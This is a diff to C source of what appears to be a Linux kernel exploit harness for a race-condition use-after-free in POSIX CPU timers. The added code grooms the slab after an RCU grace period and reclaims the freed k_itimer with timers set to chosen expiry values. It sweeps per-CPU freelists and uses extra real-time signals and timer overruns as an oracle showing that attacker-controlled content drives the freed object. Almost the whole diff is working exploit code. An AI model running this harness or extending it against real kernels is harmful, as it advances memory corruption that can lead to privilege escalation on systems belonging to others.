@@ -62,6 +62,9 @@
 #define MARKER_FD 3
 #define SPRAY_TIMERS 64
 #define LEADER_LOAD_TIMERS 48
+#define RECLAIM_PROBES 8
+#define CPU2_PROBES 600
+#define RECLAIM_SIG SIGRTMIN
 #define CHURN_TIMERS 16
 #define CASCADE_TIMERS 8
 #define DHAMMER_TIMERS 512
@@ -79,6 +82,8 @@ static struct race_shm *shm;
 
 static const char *g_self;
 static timer_t g_timer;
+static sigset_t set44;
+static int armed;
 
 static inline uint64_t cntvct(void)
 {
@@ -415,11 +420,13 @@ static void racing_child(long iter)
 
 static void phase2(unsigned long iter, unsigned mode, uint64_t t_go)
 {
-	struct sigevent sev = { .sigev_notify = SIGEV_NONE };
-	timer_t spray[SPRAY_TIMERS], churn[CHURN_TIMERS];
+	struct sigevent sev;
+	timer_t probe[4][RECLAIM_PROBES];
+	timer_t deep[CPU2_PROBES];
 	struct itimerspec its;
+	struct timespec ts;
 	uint64_t freq = cntfrq();
-	int anomalies = 0;
+	int anomalies = 0, sigcount = 0, overruns = 0;
 
 	pin(1);
 	/* Report the true go->exec-complete latency; the settime window
@@ -433,50 +440,111 @@ static void phase2(unsigned long iter, unsigned mode, uint64_t t_go)
 	}
 
 	/*
-	 * Stage B: cover the RCU grace period behind k_itimer_rcu_free()
-	 * with same-cache allocations, then churn the surviving thread-group
-	 * cputimer queue so any freed-but-still-queued ghost is walked,
-	 * fired, aliased or erased.
+	 * Stage B, controlled-reclaim edition. If this trial's parent-side
+	 * delete won the race, an armed k_itimer sits freed-but-queued in
+	 * this process's cputimer rbtree, and k_itimer_rcu_free() returns
+	 * the slot to the slab after an RCU grace period. Cover that grace
+	 * period QUIETLY (no armed CPU timers, so no queue walk rebalances
+	 * through the freelist-mangled ghost), then reclaim the slot with
+	 * monotonic timers armed at an absolute PAST time and delivering a
+	 * queued RT signal. If a probe's hrtimer lands on the ghost, the
+	 * ghost's expires becomes the chosen tiny value; the next queue
+	 * walk fires it and posix_timer_event() queues one EXTRA RT signal
+	 * to this process. sigcount above the number of armed probes is a
+	 * clean userspace oracle for attacker-chosen content driving the
+	 * freed object, and the fire path dequeues the ghost cleanly.
 	 */
-	for (int cycle = 0; cycle < 24; cycle++) {
-		uint64_t start;
+	for (int i = 0; i < CPU2_PROBES; i++)
+		deep[i] = (timer_t)-1;
+	sigemptyset(&set44);
+	sigaddset(&set44, RECLAIM_SIG);
+	sigprocmask(SIG_BLOCK, &set44, NULL);
+	uint64_t start = cntvct();
 
-		for (int i = 0; i < SPRAY_TIMERS; i++)
-			spray[i] = (timer_t)-1;
-		for (int i = 0; i < CHURN_TIMERS; i++)
-			churn[i] = (timer_t)-1;
+	while ((cntvct() - start) / (freq / 1000) < 80)
+		asm volatile("yield");
+	emit("QUIET_DONE iter=%ld\n", (long)iter);
 
-		/* The freed k_itimer lands on whichever per-CPU freelist ran
-		 * the RCU callback; cycle CPUs so the sprays sample them. */
-		pin(cycle & 1 ? 0 : 1);
-
-		for (int i = 0; i < SPRAY_TIMERS; i++)
-			if (timer_create(CLOCK_MONOTONIC, &sev, &spray[i]))
+	memset(&its, 0, sizeof(its));
+	its.it_value.tv_nsec = 1;	/* absolute past: expires = 1 */
+	for (int cpu = 0; cpu < 4; cpu++) {
+		pin(cpu == 0 ? 1 : cpu == 1 ? 0 : cpu == 2 ? 3 : 2);
+		sev.sigev_notify = SIGEV_SIGNAL;
+		sev.sigev_signo = RECLAIM_SIG;
+		sev.sigev_value.sival_ptr = NULL;
+		for (int i = 0; i < RECLAIM_PROBES; i++) {
+			if (timer_create(CLOCK_MONOTONIC, &sev, &probe[cpu][i]) ||
+			    timer_settime(probe[cpu][i], TIMER_ABSTIME, &its,
+					  NULL))
 				anomalies++;
-		for (int i = 0; i < CHURN_TIMERS; i++) {
-			if (timer_create(CLOCK_PROCESS_CPUTIME_ID, &sev,
-					 &churn[i]))
-				continue;
-			memset(&its, 0, sizeof(its));
-			its.it_value.tv_nsec = 100000 * (long)(i + 1);
-			if (timer_settime(churn[i], 0, &its, NULL))
-				anomalies++;
+			else
+				armed++;
 		}
-
-		start = cntvct();
-		while ((cntvct() - start) / (freq / 1000) < 4)
-			asm volatile("yield");
-
-		for (int i = 0; i < CHURN_TIMERS; i++)
-			if (churn[i] != (timer_t)-1)
-				timer_delete(churn[i]);
-		for (int i = 0; i < SPRAY_TIMERS; i++)
-			if (spray[i] != (timer_t)-1)
-				timer_delete(spray[i]);
 	}
 
-	emit("PHASE2 iter=%ld mode=%u anomalies=%d\n", (long)iter, mode,
-	     anomalies);
+	/*
+	 * Deep CPU2 sweep: all 512 parent deletes of this trial queued RCU
+	 * callbacks ahead of the ghost's, FIFO order puts up to ~511 freed
+	 * objects ahead of it on CPU2's freelist. Pop past them so one
+	 * allocation certainly lands on the ghost.
+	 */
+	pin(2);
+	for (int i = 0; i < CPU2_PROBES; i++) {
+		if (timer_create(CLOCK_MONOTONIC, &sev, &deep[i]) ||
+		    timer_settime(deep[i], TIMER_ABSTIME, &its, NULL))
+			anomalies++;
+		else
+			armed++;
+	}
+	emit("PROBES_ARMED iter=%ld armed=%d anomalies=%d\n",
+	     (long)iter, armed, anomalies);
+	/* Burn CPU so ticks run this group's queue walk: that is what
+	 * fires an aliased ghost (leftmost, chosen tiny expires). */
+	start = cntvct();
+	while ((cntvct() - start) / (freq / 1000) < 30)
+		asm volatile("yield");
+	ts.tv_sec = 0;
+	ts.tv_nsec = 60000000;
+	while (sigcount < armed + 4) {
+		siginfo_t si;
+
+		if (sigtimedwait(&set44, &si, &ts) < 0)
+			break;
+		sigcount++;
+		if (sigcount == armed + 1)
+			emit("GHOST_FIRE iter=%ld armed=%d extra=1\n",
+			     (long)iter, armed);
+	}
+	emit("DRAINED iter=%ld sigcount=%d\n", (long)iter, sigcount);
+	/* A one-shot fired twice surfaces as an overrun, not a second
+	 * queued signal: scan every probe as the second oracle. */
+	for (int cpu = 0; cpu < 4; cpu++)
+		for (int i = 0; i < RECLAIM_PROBES; i++)
+			if (probe[cpu][i] != (timer_t)-1 &&
+			    timer_getoverrun(probe[cpu][i]) > 0) {
+				overruns++;
+				emit("GHOST_FIRE iter=%ld overrun=1\n",
+				     (long)iter);
+			}
+	for (int i = 0; i < CPU2_PROBES; i++)
+		if (deep[i] != (timer_t)-1 &&
+		    timer_getoverrun(deep[i]) > 0) {
+			overruns++;
+			emit("GHOST_FIRE iter=%ld overrun_deep=1\n",
+			     (long)iter);
+		}
+	for (int cpu = 0; cpu < 4; cpu++)
+		for (int i = 0; i < RECLAIM_PROBES; i++)
+			if (probe[cpu][i] != (timer_t)-1)
+				timer_delete(probe[cpu][i]);
+	for (int i = 0; i < CPU2_PROBES; i++)
+		if (deep[i] != (timer_t)-1)
+			timer_delete(deep[i]);
+;
+
+	emit("PHASE2 iter=%ld mode=%u anomalies=%d armed=%d sigcount=%d "
+	     "overruns=%d\n",
+	     (long)iter, mode, anomalies, armed, sigcount, overruns);
 	_exit(0);
 }
 
